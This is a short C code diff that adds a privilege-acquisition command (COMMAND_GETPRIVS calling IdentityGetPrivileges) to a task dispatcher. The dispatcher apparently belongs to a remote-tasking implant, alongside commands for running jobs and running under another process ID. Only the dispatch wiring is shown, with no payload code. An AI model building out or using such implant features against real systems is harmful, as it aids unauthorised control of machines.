@@ -118,6 +118,9 @@ void TaskDispatch(int cmd, char* buffer, int size)
 		case COMMAND_EXECUTE_JOB:
 			JobExecute(buffer, size);
 			break;
+		case COMMAND_GETPRIVS:
+			IdentityGetPrivileges(buffer, size);
+			break;
 		case COMMAND_RUN_UNDER_PID:
 			RunUnderPid(buffer, size);
 			break;
